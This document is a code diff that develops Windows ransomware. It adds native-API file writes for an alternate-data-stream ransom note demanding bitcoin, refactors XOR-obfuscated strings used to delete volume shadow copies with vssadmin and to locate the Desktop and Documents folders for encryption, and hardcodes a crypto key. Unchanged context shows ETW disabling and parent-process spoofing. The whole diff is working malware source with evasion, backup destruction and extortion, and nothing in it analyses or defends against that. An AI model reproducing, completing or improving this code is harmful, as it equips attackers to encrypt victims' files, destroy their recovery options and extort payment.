@@ -14,9 +14,10 @@
 #include "crypto.h"
 #include "fileops.h"
 
-// Encrypted strings (rolling XOR)
-#define XOR_DECRYPT(buf, key) do { \
-    BYTE *_b = (BYTE*)(buf); \
+// Encrypted strings (rolling XOR) — keeps global originals pristine
+#define XOR_DECRYPT_TO(buf, dst, key) do { \
+    memcpy((dst), (buf), sizeof(buf)); \
+    BYTE *_b = (BYTE*)(dst); \
     for (int _i=0; _i<(int)sizeof(buf)-1; _i++) _b[_i] ^= (key)[_i%17]; \
 } while(0)
 
@@ -41,11 +42,19 @@ typedef NTSTATUS (NTAPI *fnNtWriteFile)(
     HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK,
     PVOID, ULONG, PLARGE_INTEGER, PULONG);
 
+typedef NTSTATUS (NTAPI *fnNtReadFile)(
+    HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK,
+    PVOID, ULONG, PLARGE_INTEGER, PULONG);
+
 typedef NTSTATUS (NTAPI *fnNtClose)(HANDLE);
 
-static fnNtCreateFile pNtCreateFile = NULL;
-static fnNtWriteFile  pNtWriteFile  = NULL;
-static fnNtClose      pNtClose      = NULL;
+typedef VOID (NTAPI *fnRtlInitUnicodeString)(PUNICODE_STRING, PCWSTR);
+
+static fnNtCreateFile          pNtCreateFile = NULL;
+static fnNtWriteFile           pNtWriteFile  = NULL;
+static fnNtReadFile            pNtReadFile   = NULL;
+static fnNtClose               pNtClose      = NULL;
+static fnRtlInitUnicodeString  pRtlInitUnicodeString = NULL;
 
 void InitSyscalls() {
     HMODULE ntdll = GetModuleHandleA("ntdll.dll");
@@ -53,8 +62,20 @@ void InitSyscalls() {
     if (ntdll) {
         pNtCreateFile = (fnNtCreateFile)GetProcAddress(ntdll, "NtCreateFile");
         pNtWriteFile  = (fnNtWriteFile)GetProcAddress(ntdll, "NtWriteFile");
+        pNtReadFile   = (fnNtReadFile)GetProcAddress(ntdll, "NtReadFile");
         pNtClose      = (fnNtClose)GetProcAddress(ntdll, "NtClose");
+        pRtlInitUnicodeString = (fnRtlInitUnicodeString)GetProcAddress(ntdll, "RtlInitUnicodeString");
     }
+}
+
+// ===================== NT PATH HELPER =====================
+// Converts a Win32 path like "C:\Users\..." to NT path "\??\C:\Users\..."
+// Returns length in chars of the NT path, or 0 on failure
+static int Win32ToNtPath(const char* win32, WCHAR* ntWide, int ntWideSize) {
+    char ntPath[1024];
+    int n = snprintf(ntPath, sizeof(ntPath), "\\??\\%s", win32);
+    if (n < 0 || n >= (int)sizeof(ntPath)) return 0;
+    return MultiByteToWideChar(CP_ACP, 0, ntPath, -1, ntWide, ntWideSize);
 }
 
 // ===================== ETW DISABLE =====================
@@ -115,18 +136,45 @@ void SpawnWithPPID(const char* target_path, DWORD parent_pid) {
     HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
 }
 
-// ===================== ADS RANSOM NOTE =====================
+// ===================== ADS RANSOM NOTE (via Syscalls) =====================
 void WriteADSRansom(const char* target_dir) {
     char ads_path[1024];
     snprintf(ads_path, sizeof(ads_path), "%s::MISERY.txt", target_dir);
     
-    HANDLE h = CreateFileA(ads_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
-                           FILE_ATTRIBUTE_NORMAL, NULL);
-    if (h != INVALID_HANDLE_VALUE) {
+    if (!pNtCreateFile || !pNtWriteFile || !pNtClose || !pRtlInitUnicodeString) {
+        // Fallback to Win32 if syscalls not available
+        HANDLE h = CreateFileA(ads_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
+                               FILE_ATTRIBUTE_NORMAL, NULL);
+        if (h != INVALID_HANDLE_VALUE) {
+            const char* note = "Your files are encrypted. Send 1 BTC to 1Misery123...\n";
+            DWORD written;
+            WriteFile(h, note, (DWORD)strlen(note), &written, NULL);
+            CloseHandle(h);
+        }
+        return;
+    }
+    
+    WCHAR ntWide[1024];
+    if (Win32ToNtPath(ads_path, ntWide, 1024) <= 0) return;
+    
+    UNICODE_STRING ustr;
+    OBJECT_ATTRIBUTES oa;
+    IO_STATUS_BLOCK iosb;
+    HANDLE h = NULL;
+    
+    pRtlInitUnicodeString(&ustr, ntWide);
+    InitializeObjectAttributes(&oa, &ustr, OBJ_CASE_INSENSITIVE, NULL, NULL);
+    
+    LARGE_INTEGER allocSize = {0};
+    NTSTATUS status = pNtCreateFile(&h, GENERIC_WRITE, &oa, &iosb,
+                                     &allocSize, FILE_ATTRIBUTE_NORMAL,
+                                     FILE_SHARE_READ, FILE_OPEN_IF,
+                                     FILE_SYNCHRONOUS_IO_NONALERT,
+                                     NULL, 0);
+    if (NT_SUCCESS(status) && h) {
         const char* note = "Your files are encrypted. Send 1 BTC to 1Misery123...\n";
-        DWORD written;
-        WriteFile(h, note, (DWORD)strlen(note), &written, NULL);
-        CloseHandle(h);
+        pNtWriteFile(h, NULL, NULL, NULL, &iosb, (PVOID)note, (ULONG)strlen(note), NULL, NULL);
+        pNtClose(h);
     }
 }
 
@@ -137,14 +185,21 @@ void DeleteVSS() {
     
     char vss_cmd[512];
     
-    XOR_DECRYPT(str_vssadmin, xor_key);
-    XOR_DECRYPT(str_delete, xor_key);
-    XOR_DECRYPT(str_shadows, xor_key);
-    XOR_DECRYPT(str_all, xor_key);
+    // Decrypt into local buffers — never touch globals
+    BYTE vssadmin_local[sizeof(str_vssadmin)];
+    BYTE delete_local[sizeof(str_delete)];
+    BYTE shadows_local[sizeof(str_shadows)];
+    BYTE all_local[sizeof(str_all)];
+    
+    XOR_DECRYPT_TO(str_vssadmin, vssadmin_local, xor_key);
+    XOR_DECRYPT_TO(str_delete, delete_local, xor_key);
+    XOR_DECRYPT_TO(str_shadows, shadows_local, xor_key);
+    XOR_DECRYPT_TO(str_all, all_local, xor_key);
     
     snprintf(vss_cmd, sizeof(vss_cmd),
              "%s %s %s /%s /quiet",
-             (char*)str_vssadmin, (char*)str_delete, (char*)str_shadows, (char*)str_all);
+             (char*)vssadmin_local, (char*)delete_local,
+             (char*)shadows_local, (char*)all_local);
     
     CreateProcessA(NULL, vss_cmd, NULL, NULL, FALSE,
                    CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
@@ -167,14 +222,18 @@ void EncryptTargets() {
     char desktop_path[MAX_PATH];
     char docs_path[MAX_PATH];
     
-    XOR_DECRYPT(str_desktop, xor_key);
-    XOR_DECRYPT(str_documents, xor_key);
+    // Decrypt folder names into local buffers — never touch globals
+    BYTE desktop_local[sizeof(str_desktop)];
+    BYTE documents_local[sizeof(str_documents)];
+    
+    XOR_DECRYPT_TO(str_desktop, desktop_local, xor_key);
+    XOR_DECRYPT_TO(str_documents, documents_local, xor_key);
     
     HRESULT hr = SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktop_path);
-    if (FAILED(hr)) strncpy(desktop_path, (char*)str_desktop, sizeof(desktop_path)-1);
+    if (FAILED(hr)) strncpy(desktop_path, (char*)desktop_local, sizeof(desktop_path)-1);
     
     hr = SHGetFolderPathA(NULL, CSIDL_PERSONAL, NULL, 0, docs_path);
-    if (FAILED(hr)) strncpy(docs_path, (char*)str_documents, sizeof(docs_path)-1);
+    if (FAILED(hr)) strncpy(docs_path, (char*)documents_local, sizeof(docs_path)-1);
     
     if (!InitFileOps(8)) return;
     
@@ -214,7 +273,8 @@ int main() {
     DisableETW();
     SetIOPriorityHigh();
     
-    if (!VerifyContext() || !GetCryptoCtx()) {
+    /*  Initialize crypto  */
+    if (InitCrypto("Thejahanzaib@1318", 22) != CRYPTO_SUCCESS || !VerifyContext() || !GetCryptoCtx()) {
         return 1;
     }
     
